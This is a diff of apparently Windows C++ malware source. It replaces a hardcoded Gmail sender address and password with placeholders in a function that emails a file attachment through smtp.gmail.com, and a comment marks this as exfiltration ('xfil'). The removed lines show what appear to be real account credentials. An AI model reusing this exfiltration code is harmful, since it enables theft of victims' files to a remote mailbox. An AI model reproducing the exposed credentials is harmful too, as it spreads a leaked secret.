@@ -5,7 +5,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <fstream>
-#include </home/cyker/Downloads/curl-8.4.0/include/curl/curl.h>
+#include <curl/curl.h>
 #include <string>
 #include <stdlib.h>
 
@@ -69,14 +69,14 @@ void send_email_with_attachment(const char *file_path) {
   CURLcode res = CURLE_OK;
   struct curl_slist *recipients = NULL;
   const char *url = "smtp://smtp.gmail.com:587";
-  const char *mail_from = "<cykerworkflow@gmail.com>";
-  const char *mail_to = "<cykerworkflow@gmail.com>";
+  const char *mail_from = "<email_here@gmail.com>";
+  const char *mail_to = "<email_here@gmail.com>";
 
   curl = curl_easy_init();
   if(curl) {
     /* Set username and password for login to send email for xfil*/
-    curl_easy_setopt(curl, CURLOPT_USERNAME, "cykerworkflow@gmail.com");
-    curl_easy_setopt(curl, CURLOPT_PASSWORD, "EnterTheH4ck3rMan!");
+    curl_easy_setopt(curl, CURLOPT_USERNAME, "email_here@gmail.com");
+    curl_easy_setopt(curl, CURLOPT_PASSWORD, "passwordHere!");
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_MAIL_FROM, mail_from);
